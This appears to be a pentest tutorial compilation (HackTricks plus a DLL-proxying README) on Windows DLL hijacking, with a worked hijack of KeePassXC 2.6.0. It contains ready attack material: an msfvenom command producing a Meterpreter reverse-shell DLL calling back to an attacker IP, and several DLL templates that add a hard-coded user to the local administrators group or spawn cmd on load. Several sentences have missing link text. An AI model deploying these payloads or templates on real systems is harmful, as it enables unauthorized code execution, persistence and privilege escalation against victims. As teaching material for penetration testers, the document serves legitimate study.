Dll Hijacking
Support HackTricks and get benefits!
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking

##
##

#######################
#######################


# Exploiting DLL Hijacking by DLL Proxying Super Easily

## TL;DR

This is a tutorial about exploiting DLL Hijack vulnerability
without crashing the application. The method used is called DLL Proxying.

There are various Visual Studio projects for Windows about this, but
here is how to build and **cross-compile the Proxy DLL with
[mingw-w64](http://mingw-w64.org/doku.php) super easily on Linux**.

## Introduction

DLL Hijacking in a nutshell: there is a search order (of predefined paths) for
an application to look for required DLLs, and if it is possible to put a malicious
DLL with the same name in the search path before the legitimate target DLL, then
it is possible to hijack the execution flow by the replacement exported methods
of the malicious DLL.

It can be used by attackers for persistence or even privilege escalation.
Under some special conditions and configurations, it can be also used for
domain level privilege escalation and even for remote code execution.

There are two important requirements of the malicious replacement DLL:

1. The malicious DLL should export the functions (at least by dummy implementations)
which the application tries to import otherwise the application fails to load
and malicious DLL would also not be loaded.

2. If the malicious DLL exports the functions required by the application
but does not implement them equivalently to the legitimate DLL, the application
loads the DLL and probably executes the malicious code (e.g. in the `DllMain()`
function), but afterwards the application crashes.

The solution for these two problems is DLL Proxying: create a malicious DLL
which exports all of the functions of the legitimate DLL and instead of
implementing them, just forward the calls to the legitimate DLL.

This way the application behaves normally without crashing and it can
execute the malicious code silently in the background.

## Creating the Proxy DLL

Let's assume the target DLL we want to proxy to is `target_orig.dll` and the proxy DLL
will be `target.dll`. It is possible to use a basic template for `target.c`:

```c
void Payload()
{
    // Malicious payload should be implemented here...
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
  switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
      Payload();
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
    }
  return TRUE;
}
```

Defining the exports is possible easily during link-time by using
[Module-Definition (.def) files](https://docs.microsoft.com/en-us/cpp/build/reference/module-definition-dot-def-files?view=vs-2019)
which is fortunately supported by the mingw-w64 cross-compiler toolset. In the `.def` file it is also possible
to instruct the linker to use external references for the exported functions to the legitimate DLL file.

The [required syntax](https://docs.microsoft.com/en-us/cpp/build/reference/exports?view=vs-2019) for the `.def` file exports:

```
EXPORTS
  exported_name1=legitimate_dll_module.exported_name1 @ordinal1
  exported_name2=legitimate_dll_module.exported_name2 @ordinal2
  ...
```

In order to generate the `.def` file all we need is the export list of the legitimate DLL.
Extracting the export list is really simple by using the Python [pefile](https://github.com/erocarrera/pefile)
Portable Executable (PE) parser module. Here is how to do it
(script is included [here](./gen_def.py) in the repo):

```python
import pefile

dll = pefile.PE('target_orig.dll')

print("EXPORTS")
for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
    if export.name:
        print('{}=target_orig.{} @{}'.format(export.name.decode(), export.name.decode(), export.ordinal))
```

The output of this short script is the required `target.def` file for the mingw-w64 linker.

Now compiling and linking is trivial by using mingw-w64 cross-compiler (e.g. on Linux, targeting Windows 32-bit arch):

```
i686-w64-mingw32-gcc -shared -o target.dll target.c target.def -s
```

The resulted `target.dll` proxies all of the calls to the exported functions to the legitimate `target_orig.dll`.
This way the application depending on the methods of `target.dll` is working normally, but it executes our
`Payload()` function at initialization. ;)

This is not new, this is a well-known technique, but the above mingw-w64 method with the module-definition file
for creating the Proxy DLL is one of the simplest.

## Example

Let's take an arbitrary DLL Hijacking vulnerable app (it is easy because there are many): e.g.
[KeePassXC 2.6.0 Portable (32-bit)](https://github.com/keepassxreboot/keepassxc/releases/download/2.6.0/KeePassXC-2.6.0-Win32-Portable.zip).

Using [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
it is easy to detect a potentional DLL Hijacking issue:

![](screenshots/keepassxc_dll_hijack_vuln_detected.png)

Here the `KeePassXC.exe` app tries to load the library `version.dll`,
first from the path of the exe resulting `NAME NOT FOUND` then
it finds the dll in the official `C:\Windows\SysWOW64` folder.

Let's try to target this `version.dll` loading:
let's put a malicious version of the dll to the exe folder.

Copy the legitimate one from `C:\Windows\SysWOW64\version.dll` to
the Linux host as `version_orig.dll`.

Generating the `version.def` file containing the export
redirections by the Python script:

```
gen_def.py version_orig.dll > version.def
```

Here is (version.c)[./version.c] adding an example `Payload()`
launching `calc.exe` to the above template:

```c
#include <processthreadsapi.h>
#include <memoryapi.h>

void Payload()
{
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  
  char cmd[] = "calc.exe";
  
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  ZeroMemory(&pi, sizeof(pi));

  CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
  switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
      Payload();
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
    }
  return TRUE;
}
```

Cross-compiling and linking the malicious Proxy DLL using mingw-w64:

```
i686-w64-mingw32-gcc -shared -o version.dll version.c version.def -s
```

Copy the malicious `version.dll` proxy and the legitimate `version_orig.dll`
to the home folder of KeePassXC:

![](screenshots/keepassxc_malicious_dll_added.png)

And now launch `KeePassXC.exe`! The application should work well and
behave normally and our payload is also excecuted (`calc.exe` launched). :)

![](screenshots/keepassxc_hijacked_calc.png)


###############################
###############################

​
​
If you are interested in hacking carer and hack the unhackable - we are hiring! (fluent polish written and spoken required).
Definition
First of all, let’s get the definition out of the way. DLL hijacking is, in the broadest sense, tricking a legitimate/trusted application into loading an arbitrary DLL. Terms such as DLL Search Order Hijacking, DLL Load Order Hijacking, DLL Spoofing, DLL Injection and DLL Side-Loading are often -mistakenly- used to say the same.
Dll hijacking can be used to execute code, obtain persistence and escalate privileges. From those 3 the least probable to find is privilege escalation by far. However, as this is part of the privilege escalation section, I will focus on this option. Also, note that independently of the goal, a dll hijacking is perform the in the same way.
Types
There is a variety of approaches to choose from, with success depending on how the application is configured to load its required DLLs. Possible approaches include:
DLL replacement: replace a legitimate DLL with an evil DLL. This can be combined with DLL Proxying [], which ensures all functionality of the original DLL remains intact.
DLL search order hijacking: DLLs specified by an application without a path are searched for in fixed locations in a specific order []. Hijacking the search order takes place by putting the evil DLL in a location that is searched in before the actual DLL. This sometimes includes the working directory of the target application.
Phantom DLL hijacking: drop an evil DLL in place of a missing/non-existing DLL that a legitimate application tries to load [].
DLL redirection: change the location in which the DLL is searched for, e.g. by editing the %PATH% environment variable, or .exe.manifest / .exe.local files to include the folder containing the evil DLL [, ] .
WinSxS DLL replacement: replace the legitimate DLL with the evil DLL in the relevant WinSxS folder of the targeted DLL. Often referred to as DLL side-loading [].
Relative path DLL Hijacking: copy (and optionally rename) the legitimate application to a user-writeable folder, alongside the evil DLL. In the way this is used, it has similarities with (Signed) Binary Proxy Execution []. A variation of this is (somewhat oxymoronically called) ‘bring your own LOLbin’ [] in which the legitimate application is brought with the evil DLL (rather than copied from the legitimate location on the victim’s machine).
Finding missing Dlls
The most common way to find missing Dlls inside a system is running  from sysinternals, setting the following 2 filters:
and just show the File System Activity:
If you are looking for missing dlls in general you leave this running for some seconds.
If you are looking for a missing dll inside an specific executable you should set another filter like "Process Name" "contains" "<exec name>", execute it, and stop capturing events.
Exploiting Missing Dlls
In order to escalate privileges, the best chance we have is to be able to write a dll that a privilege process will try to load in some of place where it is going to be searched. Therefore, we will be able to write a dll in a folder where the dll is searched before the folder where the original dll is (weird case), or we will be able to write on some folder where the dll is going to be searched and the original dll doesn't exist on any folder.
Dll Search Order
Inside the  you can find how the Dlls are loaded specifically.
In general, a Windows application will use pre-defined search paths to find DLL's and it will check these paths in a specific order. DLL hijacking usually happens by placing a malicious DLL in one of these folders while making sure that DLL is found before the legitimate one. This problem can be mitigated by having the application specify absolute paths to the DLL's that it needs.
You can see the DLL search order on 32-bit systems below:
The directory from which the application loaded.
The system directory. Use the  function to get the path of this directory.(C:\Windows\System32)
The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (C:\Windows\System)
The Windows directory. Use the  function to get the path of this directory.
(C:\Windows)
The current directory.
The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.
That is the default search order with SafeDllSearchMode enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode registry value and set it to 0 (default is enabled).
If  function is called with LOAD_WITH_ALTERED_SEARCH_PATH the search begins in the directory of the executable module that LoadLibraryEx is loading.
Finally, note that a dll could be loaded indicating the absolute path instead just the name. In that case that dll is only going to be searched in that path (if the dll has any dependencies, they are going to be searched as just loaded by name).
There are other ways to alter the ways to alter the search order but I'm not going to explain them here.
Exceptions on dll search order from Windows docs
If a DLL with the same module name is already loaded in memory, the system checks only for redirection and a manifest before resolving to the loaded DLL, no matter which directory it is in. The system does not search for the DLL.
If the DLL is on the list of known DLLs for the version of Windows on which the application is running, the system uses its copy of the known DLL (and the known DLL's dependent DLLs, if any) instead of searching for the DLL. For a list of known DLLs on the current system, see the following registry key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs.
If a DLL has dependencies, the system searches for the dependent DLLs as if they were loaded with just their module names. This is true even if the first DLL was loaded by specifying a full path.
Escalating Privileges
Requisites:
Find a process that runs/will run as with other privileges (horizontal/lateral movement) that is missing a dll.
Have write permission on any folder where the dll is going to be searched (probably the executable directory or some folder inside the system path).
Yeah, the requisites are complicated to find as by default it's kind of weird to find a privileged executable missing a dll and it's even more weird to have write permissions on a system path folder (you can't by default). But, in misconfigured environments this is possible.
In the case you are lucky and you find yourself meeting the requirements, you could check the  project. Even if the main goal of the project is bypass UAC, you may find there a PoC of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).
Note that you can check your permissions in a folder doing:
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
And check permissions of all folders inside PATH:
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
You can also check the imports of an executable and the exports of a dll with:
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
Automated tools
​will check if you have write permissions on any folder inside system PATH.
Other interesting automated tools to discover this vulnerability are PowerSploit functions: Find-ProcessDLLHijack, Find-PathDLLHijack and Write-HijackDll.
Example
In case you find an exploitable scenario one of the most important things to successfully exploit it would be to create a dll that exports at least all the functions the executable will import from it. Anyway, note that Dll Hijacking comes handy in order to  or from. You can find an example of how to create a valid dll inside this dll hijacking study focused on dll hijacking for execution: .
Moreover, in the next section you can find some basic dll codes that might be useful as templates or to create a dll with non required functions exported.
Creating and compiling Dlls
Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
Your own
Note that in several cases the Dll that you compile must export several functions that are going to be loaded by the victim process, if these functions doesn't exist the binary won't be able to load them and the exploit will fail.
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
​
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
​
#include <windows.h>
​
int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}
​
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll
​
#include<windows.h>
#include<stdlib.h>
#include<stdio.h>
​
void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}
​
BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
